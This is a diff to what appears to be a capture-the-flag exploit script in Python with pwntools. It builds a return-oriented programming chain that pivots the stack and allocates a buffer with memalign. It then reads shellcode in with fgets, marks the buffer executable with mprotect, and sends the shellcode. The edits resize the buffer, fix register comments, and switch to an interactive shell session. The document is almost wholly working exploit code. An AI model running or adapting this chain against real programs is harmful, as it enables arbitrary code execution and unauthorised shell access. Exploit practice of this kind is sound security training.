@@ -76,14 +76,14 @@ FGETS    = 0x00401070 # sym.imp.fgets
 MEMALIGN = 0x00401090 # sym.imp.memalign
 MPROTECT = 0x004010d0 # sym.imp.mprotect
 STDIN    = 0x004040a0 # obj.stdin__GLIBC_2.2.5
-BUFLEN   = 0x100
+BUFLEN   = 0x1000
 ALIGN    = 0x1000
 
 ROP = [
         # PIVOT RSP
         PAD, PAD, PAD, # pop {r13, r14, r15}:
 
-        # memalign(rdi=align, rdx=size) call
+        # memalign(rdi=align, rsi=size) call
         RSI, # rsi=BUFLEN
         BUFLEN,
         PAD, # pop r15
@@ -102,12 +102,12 @@ ROP = [
         PAD, # pop r15
         FGETS, # ret to fgets
 
-        # mprotect(rdi=buf, rsi=0x2000, rdx=5)
+        # mprotect(rdi=buf, rsi=BUFLEN, rdx=FLAGS)
         RAX, # Why did RDI change??
         RSI, # rdx=0
         0x7, # PROT_READ | PROT_EXEC | WRITE
         PAD, # pop r15
-        RDX,
+        RDX, # mov rdx, rsi
         RSI,
         BUFLEN,
         PAD, # pop r15
@@ -145,5 +145,5 @@ p.sendline("0")
 
 p.sendline(str(RSP)) # Trigger pivot to ROP-chain
 p.sendline(SHELLCODE) # Send shellcode.
-print p.readall()
+p.interactive()
 
